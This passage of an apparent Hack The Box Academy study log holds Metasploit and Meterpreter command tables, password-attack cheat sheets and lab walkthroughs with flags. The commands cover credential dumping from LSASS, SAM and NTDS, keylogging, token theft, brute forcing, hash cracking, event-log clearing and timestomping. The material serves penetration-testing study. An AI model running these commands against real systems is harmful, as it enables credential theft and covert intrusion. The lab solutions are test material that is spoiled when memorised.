| `set payload <payload>`                          | Specify the payload to use.                                                                                                                       |
| `set payload <number>`                           | Specify the payload index number to use after the show payloads command.                                                                          |
| `show advanced`                                  | Show advanced options.                                                                                                                            |
| `set autorunscript migrate -f`                   | Automatically migrate to a separate process upon exploit completion.                                                                              |
| `check`                                          | Determine whether a target is vulnerable to an attack.                                                                                            |
| `exploit`                                        | Execute the module or exploit and attack the target.                                                                                              |
| `exploit -j`                                     | Run the exploit under the context of the job. (This will run the exploit in the background.)                                                      |
| `exploit -z`                                     | Do not interact with the session after successful exploitation.                                                                                   |
| `exploit -e <encoder>`                           | Specify the payload encoder to use (example: exploit –e shikata_ga_nai).                                                                          |
| `exploit -h`                                     | Display help for the exploit command.                                                                                                             |
| `sessions -l`                                    | List available sessions (used when handling multiple shells).                                                                                     |
| `sessions -l -v`                                 | List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.                             |
| `sessions -s <script>`                           | Run a specific Meterpreter script on all Meterpreter live sessions.                                                                               |
| `sessions -K`                                    | Kill all live sessions.                                                                                                                           |
| `sessions -c <cmd>`                              | Execute a command on all live Meterpreter sessions.                                                                                               |
| `sessions -u <sessionID>`                        | Upgrade a normal Win32 shell to a Meterpreter console.                                                                                            |
| `db_create <name>`                               | Create a database to use with database-driven attacks (example: db_create autopwn).                                                               |
| `db_connect <name>`                              | Create and connect to a database for driven attacks (example: db_connect autopwn).                                                                |
| `db_nmap`                                        | Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.)                                                  |
| `db_destroy`                                     | Delete the current database.                                                                                                                      |
| `db_destroy  <user:password@host:port/database>` | Delete database using advanced options.                                                                                                           |
|                                                  |                                                                                                                                                   |

**Meterpreter Commands**

| **Command**                                           | **Description**                                                                               |
| :---------------------------------------------------- | :-------------------------------------------------------------------------------------------- |
| `help`                                                | Open Meterpreter usage help.                                                                  |
| `run <scriptname>`                                    | Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.       |
| `sysinfo`                                             | Show the system information on the compromised target.                                        |
| `ls`                                                  | List the files and folders on the target.                                                     |
| `use priv`                                            | Load the privilege extension for extended Meterpreter libraries.                              |
| `ps`                                                  | Show all running processes and which accounts are associated with each process.               |
| `migrate <proc. id>`                                  | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |
| `use incognito`                                       | Load incognito functions. (Used for token stealing and impersonation on a target machine.)    |
| `list_tokens -u`                                      | List available tokens on the target by user.                                                  |
| `list_tokens -g`                                      | List available tokens on the target by group.                                                 |
| `impersonate_token <DOMAIN_NAMEUSERNAME>`             | Impersonate a token available on the target.                                                  |
| `steal_token <proc. id>`                              | Steal the tokens available for a given process and impersonate that token.                    |
| `drop_token`                                          | Stop impersonating the current token.                                                         |
| `getsystem`                                           | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.        |
| `shell`                                               | Drop into an interactive shell with all available tokens.                                     |
| `execute -f <cmd.exe> -i`                             | Execute cmd.exe and interact with it.                                                         |
| `execute -f <cmd.exe> -i -t`                          | Execute cmd.exe with all available tokens.                                                    |
| `execute -f <cmd.exe> -i -H -t`                       | Execute cmd.exe with all available tokens and make it a hidden process.                       |
| `rev2self`                                            | Revert back to the original user you used to compromise the target.                           |
| `reg <command>`                                       | Interact, create, delete, query, set, and much more in the target’s registry.                 |
| `setdesktop <number>`                                 | Switch to a different screen based on who is logged in.                                       |
| `screenshot`                                          | Take a screenshot of the target’s screen.                                                     |
| `upload <filename>`                                   | Upload a file to the target.                                                                  |
| `download <filename>`                                 | Download a file from the target.                                                              |
| `keyscan_start`                                       | Start sniffing keystrokes on the remote target.                                               |
| `keyscan_dump`                                        | Dump the remote keys captured on the target.                                                  |
| `keyscan_stop`                                        | Stop sniffing keystrokes on the remote target.                                                |
| `getprivs`                                            | Get as many privileges as possible on the target.                                             |
| `uictl enable <keyboard/mouse>`                       | Take control of the keyboard and/or mouse.                                                    |
| `background`                                          | Run your current Meterpreter shell in the background.                                         |
| `hashdump`                                            | Dump all hashes on the target. use sniffer Load the sniffer module.                           |
| `sniffer_interfaces`                                  | List the available interfaces on the target.                                                  |
| `sniffer_dump <interfaceID> pcapname`                 | Start sniffing on the remote target.                                                          |
| `sniffer_start <interfaceID> packet-buffer`           | Start sniffing with a specific range for a packet buffer.                                     |
| `sniffer_stats <interfaceID>`                         | Grab statistical information from the interface you are sniffing.                             |
| `sniffer_stop <interfaceID>`                          | Stop the sniffer.                                                                             |
| `add_user <username> <password> -h <ip>`              | Add a user on the remote target.                                                              |
| `add_group_user <"Domain Admins"> <username> -h <ip>` | Add a username to the Domain Administrators group on the remote target.                       |
| `clearev`                                             | Clear the event log on the target machine.                                                    |
| `timestomp`                                           | Change file attributes, such as creation date (antiforensics measure).                        |
| `reboot`                                              | Reboot the target machine.                                                                    |
|                                                       |                                                                                               |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/39)

## Password attacks

### Credential storage

**Linux**

```sh
root@htb:~# cat /etc/shadow

...SNIP...
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::

<username>:<encrypted password>:<day of last change>:<min age>:<max age>:<warning period>:<inactivity period>:<expiration date>:<reserved field>
```

The type (`id`) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.

| ID       | Cryptographic Hash Algorithm |
| -------- | ---------------------------- |
| `$1$`    | MD5                          |
| `$2a$`   | Blowfish                     |
| `$5$`    | SHA-256                      |
| `$6$`    | SHA-512                      |
| `$sha1$` | SHA1crypt                    |
| `$y$`    | Yescrypt                     |
| `$gy$`   | Gost-yescrypt                |
| `$7$`    | Scrypt                       |

**Windows Authentication Process**
![windows-auth](images/auth.png)

Local interactive logon is performed by the interaction between the logon process ([WinLogon](https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&seqNum=8) ), the logon user interface process (`LogonUI`), the credential providers, LSASS, one or more authentication packages, and SAM or Active Directory. Authentication packages, in this case, are the Dynamic-Link Libraries (`DLLs`) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package `Msv1_0.dll` is used.

`Winlogon` is a trusted process responsible for managing security-related user interactions. These include:

Launching LogonUI to enter passwords at login

Changing passwords

Locking and unlocking the workstation

It relies on credential providers installed on the system to obtain a user's account name or password. Credential providers are `COM` objects that are located in DLLs.

Winlogon is the only process that intercepts login requests from the keyboard sent via an RPC message from Win32k.sys. Winlogon immediately launches the LogonUI application at logon to display the user interface for logon. After Winlogon obtains a user name and password from the credential providers, it calls LSASS to authenticate the user attempting to log in.

**LSASS**

[Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (`LSASS`) is a collection of many modules and has access to all authentication processes that can be found in `%SystemRoot%\System32\Lsass.exe`. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the `Event log`. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture [here](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760(v=technet.10)?redirectedfrom=MSDN>).

| Authentication Package | Description                                                                                                                                                                                                                                                    |
| ---------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Lsasrv.dll`           | The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful. |
| `Msv1_0.dll`           | Authentication package for local machine logons that don't require custom authentication.                                                                                                                                                                      |
| `Samsrv.dll`           | The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.                                                                                                                                       |
| `Kerberos.dll`         | Security package loaded by the LSA for Kerberos-based authentication on a machine.                                                                                                                                                                             |
| `Netlogon.dll`         | Network-based logon service.                                                                                                                                                                                                                                   |
| `Ntdsa.dll`            | This library is used to create new records and folders in the Windows registry.                                                                                                                                                                                |

**SAM**

The [Security Account Manager](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN>) (`SAM`) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an `LM` hash or an `NTLM` hash. This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.

Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (`DC`) must validate the credentials from the Active Directory database (`ntds.dit`), which is stored in `%SystemRoot%\ntds.dit`.

Microsoft introduced a security feature in Windows NT 4.0 to help improve the security of the SAM database against offline software cracking. This is the `SYSKEY` (`syskey.exe`) feature, which, when enabled, partially encrypts the hard disk copy of the SAM file so that the password hash values for all local accounts stored in the SAM are encrypted with a key.

![credmanager](images/sam.png)

**NTDS**

It is very common to come across network environments where Windows systems are joined to a Windows domain. This is common because it makes it easier for admins to manage all the systems owned by their respective organizations (centralized management). In these cases, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called `NTDS.dit` that is kept synchronized across all Domain Controllers with the exception of [Read-Only Domain Controllers](https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema). NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

### Cheatsheet

**Connecting to Target**

| **Command**                                                                | **Description**                                                                                                                                 |
| -------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!`                    | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.                                                           |
| `evil-winrm -i <ip> -u user -p password`                                   | Uses Evil-WinRM to establish a Powershell session with a target.                                                                                |
| `ssh user@<ip>`                                                            | Uses SSH to connect to a target using a specified user.                                                                                         |
| `smbclient -U user \\\\<ip>\\SHARENAME`                                    | Uses smbclient to connect to an SMB share using a specified user.                                                                               |
| `python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/` | Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host. |

**Password Mutations**

| **Command**                                                                                                                             | **Description**                                                                                                                                         |
| --------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`                                                           | Uses cewl to generate a wordlist based on keywords present on a website.                                                                                |
| `hashcat --force password.list -r custom.rule --stdout > mut_password.list`                                                             | Uses Hashcat to generate a rule-based word list.                                                                                                        |
| `./username-anarchy -i /path/to/listoffirstandlastnames.txt`                                                                            | Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.                       |
| `curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt` | Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. |

**Remote Password Attacks**

| **Command**                                                            | **Description**                                                                                                                                                            |
| ---------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `crackmapexec winrm <ip> -u user.list -p password.list`                | Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target.                                                              |
| `crackmapexec smb <ip> -u "user" -p "password" --shares`               | Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials.                                                                                |
| `hydra -L user.list -P password.list <service>://<ip>`                 | Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.                                                    |
| `hydra -l username -P password.list <service>://<ip>`                  | Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.                                                     |
| `hydra -L user.list -p password <service>://<ip>`                      | Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.                                                         |
| `hydra -C <user_pass.list> ssh://<IP>`                                 | Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam` | Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.                                                           |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa` | Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.                      |
| `crackmapexec smb <ip> -u <username> -p <password> --ntds`             | Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.                                                                  |
| `evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>"`            | Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack.                        |

**Windows Local Password Attacks**

| **Command**                                                                                              | **Description**                                                                                                                                                                                        |
| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `tasklist /svc`                                                                                          | A command-line-based utility in Windows used to list running processes.                                                                                                                                |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`                          | Uses Windows command-line based utility findstr to search for the string "password" in many different file type.                                                                                       |
| `Get-Process lsass`                                                                                      | A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.                       |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`                               | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.                                                                |
| `pypykatz lsa minidump /path/to/lsassdumpfile`                                                           | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.                                                                                    |
| `reg.exe save hklm\sam C:\sam.save`                                                                      | Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system). |
| `move sam.save \\<ip>\NameofFileShare`                                                                   | Uses move in Windows to transfer a file to a specified file share over the network.                                                                                                                    |
| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`                 | Uses Secretsdump.py to dump password hashes from the SAM database.                                                                                                                                     |
| `vssadmin CREATE SHADOW /For=C:`                                                                         | Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely.                                                             |
| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`.                                                                                               |

**Linux Local Password Attacks**

| **Command**                                                                                                                                                                                       | **Description**                                                                                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done`                                               | Script that can be used to find .conf, .config and .cnf files on a Linux system.                                          |
| `for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done`                                      | Script that can be used to find credentials in specified file types.                                                      |
| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done`                                       | Script that can be used to find common database files.                                                                    |
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"`                                                                                                                                             | Uses Linux-based find command to search for text files.                                                                   |
| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done`                                     | Script that can be used to search for common file types used with scripts.                                                |
| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script used to look for common types of documents.                                                                        |
| `cat /etc/crontab`                                                                                                                                                                                | Uses Linux-based cat command to view the contents of crontab in search for credentials.                                   |
| `ls -la /etc/cron.*/`                                                                                                                                                                             | Uses Linux-based ls -la command to list all files that start with `cron` contained in the etc directory.                  |
| `grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`                                                                                                                                             | Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys.                 |
| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`                                                                                                                                        | Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory. |
| `grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`                                                                                                                                            | Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory.         |
| `tail -n5 /home/*/.bash*`                                                                                                                                                                         | Uses Linux-based tail command to search the through bash history files and output the last 5 lines.                       |
| `python3 mimipenguin.py`                                                                                                                                                                          | Runs Mimipenguin.py using python3.                                                                                        |
| `bash mimipenguin.sh`                                                                                                                                                                             | Runs Mimipenguin.sh using bash.                                                                                           |
| `python2.7 lazagne.py all`                                                                                                                                                                        | Runs Lazagne.py with all modules using python2.7                                                                          |
| `ls -l .mozilla/firefox/ \| grep default`                                                                                                                                                         | Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep.  |
| `cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .`                                                                                                                               | Uses Linux-based command cat to search for credentials stored by Firefox in JSON.                                         |
| `python3.9 firefox_decrypt.py`                                                                                                                                                                    | Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.         |
| `python3 lazagne.py browsers`                                                                                                                                                                     | Runs Lazagne.py browsers module using Python 3.                                                                           |

**Cracking Passwords**
| **Command** | **Description** |
| ------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt` | Uses Hashcat to crack NTLM hashes using a specified wordlist. |
| `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show` | Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output. |
| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes` | Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking. |
| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked` | Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked. |
| `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt` | Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file. |
| `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked` | Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked. |
| `ssh2john.pl SSH.private > ssh.hash` | Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash. |
| `john ssh.hash --show` | Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal. |
| `office2john.py Protected.docx > protected-docx.hash` | Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash. |
| `john --wordlist=rockyou.txt protected-docx.hash` | Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash. |
| `pdf2john.pl PDF.pdf > pdf.hash` | Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked. |
| `john --wordlist=rockyou.txt pdf.hash` | Runs John in conjunction with a wordlist to crack a pdf hash. |
| `zip2john ZIP.zip > zip.hash` | Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash. |
| `john --wordlist=rockyou.txt zip.hash` | Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash. |
| `bitlocker2john -i Backup.vhd > backup.hashes` | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes. |
| `file GZIP.gzip` | Uses the Linux-based file tool to gather file format information. |
| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done` | Script that runs a for-loop to extract files from an archive. |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/147)

## Attaking Common Services

### Interacting with Common Services

| SMB          | FTP       | Email       | Databases                            |
| ------------ | --------- | ----------- | ------------------------------------ |
| smbclient    | ftp       | Thunderbird | mssql-cli                            |
| CrackMapExec | lftp      | Claws       | mycli                                |
| SMBMap       | ncftp     | Geary       | mssqlclient.py                       |
| Impacket     | filezilla | MailSpring  | dbeaver                              |
| psexec.py    | crossftp  | mutt        | MySQL Workbench                      |
| smbexec.py   |           | mailutils   | SQL Server Management Studio or SSMS |
|              |           | sendEmail   |                                      |
|              |           | swaks       |                                      |
|              |           | sendmail    |                                      |

### SMB Naming Resolution

When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:

- The hostname file share's IP address is required.
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

### MSSQL Attacks

**Identify Users to Impersonate**
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

**Verifying our Current User and Role**
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go

**Impersonate**
EXECUTE AS LOGIN = 'john'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

**Identify Linked Servers**
SELECT srvname, isremote FROM sysservers
go

**Run Command on linked**
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
go

### Attacking Common Services - Easy

Host: 10.129.45.215

```sh
┌─[us-academy-2]─[10.10.14.187]─[htb-ac-713396@htb-ckpvnzbf3p]─[~]
└──╼ [★]$ sudo nmap -A -T5 10.129.203.7
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-23 15:27 GMT
Nmap scan report for 10.129.203.7
Host is up (0.0050s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   NULL:
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.203.7/dashboard/
443/tcp  open  https?
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 11
|   Capabilities flags: 63486
|   Some Capabilities: DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, LongColumnFlag, FoundRows, InteractiveClient, SupportsCompression, Speaks41ProtocolNew, IgnoreSigpipes, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
|   DNS_Computer_Name: WIN-EASY
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-23T15:28:23+00:00
|_ssl-date: 2024-02-23T15:28:31+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=WIN-EASY
| Not valid before: 2024-02-22T15:27:20
|_Not valid after:  2024-08-23T15:27:20
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Timing level 5 (Insane) used
No OS matches for host
Network Distance: 2 hops
Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 25/tcp)
HOP RTT     ADDRESS
1   7.99 ms 10.10.14.1
2   7.29 ms 10.129.203.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.96 seconds

┌─[us-academy-2]─[10.10.14.187]─[htb-ac-713396@htb-ckpvnzbf3p]─[~]
└──╼ [★]$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.220.215
fiona@inlanefreight.htb

┌─[us-academy-2]─[10.10.14.187]─[htb-ac-713396@htb-ckpvnzbf3p]─[~]
└──╼ [★]$ hydra -l "fiona@inlanefreight.htb" -P /usr/share/wordlists/rockyou.txt smtp://10.129.220.215 -f -t64
[25][smtp] host: 10.129.45.212   login: fiona@inlanefreight.htb   password: 987654321

┌─[us-academy-2]─[10.10.14.187]─[htb-ac-713396@htb-ckpvnzbf3p]─[~]
└──╼ [★]$ mysql -u fiona -p987654321 -h 10.129.220.215
MariaDB [mysql]> select user,password from user;
+-------+-------------------------------------------+
| User  | Password                                  |
+-------+-------------------------------------------+
| root  |                                           |
| fiona | *DABCF719388B72AD432DE5E88423B56D652DD8B0 |
| root  |                                           |
| root  |                                           |
| pma   |                                           |
+-------+-------------------------------------------+
5 rows in set (0.004 sec)

MariaDB [mysql]> select LOAD_FILE('c://users/administrator/desktop/flag.txt');
+-------------------------------------------------------+
| LOAD_FILE('c://users/administrator/desktop/flag.txt') |
+-------------------------------------------------------+
| HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}               |
+-------------------------------------------------------+
1 row in set (0.087 sec)
```

**flag:** `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`

### Attacking Common Services - Medium

Host: 10.129.88.133

```sh
┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~/Sublist3r/subbrute]
└──╼ [★]$ sudo nmap -sC -sV 10.129.88.133 -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-01 14:02 GMT
Nmap scan report for 10.129.88.133
Host is up (0.037s latency).
Not shown: 64964 closed tcp ports (reset), 565 filtered tcp ports (no-response)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7108b0c4f3ca9757649770f9fec50c7b (RSA)
|   256 45c3b51463993d9eb32251e59776e150 (ECDSA)
|_  256 2ec2416646efb68195d5aa3523945538 (ED25519)
53/tcp    open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
110/tcp   open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING STLS RESP-CODES CAPA AUTH-RESP-CODE UIDL TOP USER SASL(PLAIN)
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA AUTH-RESP-CODE RESP-CODES UIDL TOP USER SASL(PLAIN)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
2121/tcp  open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (InlaneFTP) [10.129.88.133]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
30021/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (Internal FTP) [10.129.88.133]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2121-TCP:V=7.93%I=7%D=3/1%Time=65E1E035%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8C,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.8
SF:8\.133\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creat
